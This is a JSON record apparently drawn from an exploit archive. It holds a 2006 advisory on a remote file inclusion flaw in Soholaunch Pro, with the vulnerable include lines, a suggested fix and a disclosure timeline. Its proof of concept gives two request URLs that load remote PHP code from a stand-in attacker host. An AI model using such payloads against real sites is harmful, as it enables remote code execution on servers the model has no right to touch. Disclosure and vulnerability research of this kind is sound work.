{
  "id": "2724",
  "title": "Soholaunch Pro 4.9 r36 - Remote File Inclusion",
  "cve": "CVE-2006-5796",
  "vuln_type": "rce",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\\r\n |    __)_ /    \\  \\//    ~    \\/   |   \\\r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/                              .OR.ID\r\nECHO_ADV_57$2006\r\n\r\n-----------------------------------------------------------------------------------------------\r\n[ECHO_ADV_57$2006]Soholaunch Pro <=4.9 r36 Multiple Remote File Inclusion Vulnerability\r\n-----------------------------------------------------------------------------------------------\r\n\r\nAuthor\t\t: Dedi Dwianto a.k.a the_day\r\nDate Found\t: October, 31th 2006\r\nLocation\t: Indonesia, Jakarta\r\nweb\t\t: http://advisories.echo.or.id/adv/adv57-theday-2006.txt\r\nCritical Lvl\t: Highly critical\r\nImpact\t\t: System access\r\nWhere\t\t: From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication\t: Soholaunch Pro Edition\r\nversion\t\t: <=4.9 r46\r\nURL\t\t: http://www.soholaunch.com\r\n\r\nSoholaunch Pro Edition is a software product that makes it easy for people of all experience levels to create \r\nand maintain a great website. It reins-in the hard parts of building a website and presents them a way that the \r\nnon-geek can understand and control\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~~\r\n\r\nI found vulnerability in script shared_functions.php\r\n--------------------------shared_functions.php-----------------------------------\r\n....\r\n<?\r\n...\r\ninclude_once($_SESSION['docroot_path'].\"/sohoadmin/includes/mysql_insert.class.php\");\r\n\r\n# userData manipulation class (works with misc_userdata table)\r\n\r\ninclude_once($_SESSION['docroot_path'].\"/sohoadmin/includes/userdata.class.php\");\r\n\r\n...\r\n----------------------------------------------------------\r\n\r\nInput passed to the \"$_SESSION['docroot_path']\" parameter in shared_functions.php is not\r\nproperly verified before being used. This can be exploited to execute\r\narbitrary PHP code by including files from local or external\r\nresources.\r\n\r\nAlso affected files :\r\n\r\n/client_files/shopping_cart/pgm-shopping_css.inc.php\r\n/program/includes/shared_functions.php\r\n\r\n\r\n\r\nProof Of Concept:\r\n~~~~~~~~~~~~~~~\r\n\r\nhttp://target.com/sohoadmin/program/includes/shared_functions.php?_SESSION[docroot_path]=http://attacker.com/inject.txt?\r\nhttp://target.com/sohoadmin/client_files/shopping_cart/pgm-shopping_css.inc.php?_SESSION[docroot_path]=http://attacker.com/inject.txt?\r\n\r\n\r\nSolution:\r\n~~~~~~~\r\n\r\n- Sanitize variable $_SESSION['docroot_path'] affected files.\r\n- Turn off register_globals\r\n\r\nTimeline :\r\n~~~~~~~~~\r\n\r\n31 - 10 - 2006 bugs found\r\n31 - 10 - 2006 vendor contacted\r\n07 - 11 - 2006 public disclosure\r\n\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~\r\n~ y3dips,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous\r\n~ Jessy My Brain\r\n~ az001,bomm_3x,matdhule,angelia\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel - #e-c-h-o @irc.dal.net\r\n------------------------------------------------------------------------\r\n---\r\nContact:\r\n~~~~\r\n     EcHo Research & Development Center\r\n     the_day[at]echo[dot]or[dot]id\r\n     \r\n-------------------------------- [ EOF ]----------------------------------\r\n\r\n# milw0rm.com [2006-11-06]",
  "url": "https://www.exploit-db.com/exploits/2724"
}